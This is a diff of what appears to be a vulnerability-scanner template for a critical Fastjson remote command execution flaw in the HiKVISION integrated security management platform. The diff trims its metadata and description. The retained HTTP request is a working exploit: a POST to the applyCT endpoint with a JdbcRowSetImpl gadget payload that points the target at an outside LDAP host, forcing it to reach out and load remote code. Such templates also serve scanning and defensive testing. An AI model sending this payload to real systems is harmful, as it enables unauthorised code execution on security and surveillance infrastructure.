@@ -3,14 +3,8 @@ info:
   name: HiKVISION 综合安防管理平台远程命令执行漏洞Fastjson
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zqn0emdmrzh8mk1e
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zqn0emdmrzh8mk1e
-    fofa: 暂无
 http:
 - raw:
   - 'POST /bic/ssoService/v1/applyCT HTTP/1.1
@@ -20,8 +14,6 @@ http:
 
 
     Content-Type: application/json
-
-
 
 
     {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://kjvqweuoav.dnstunnel.run","autoCommit":true},"hfe4zyyzldp":"="}
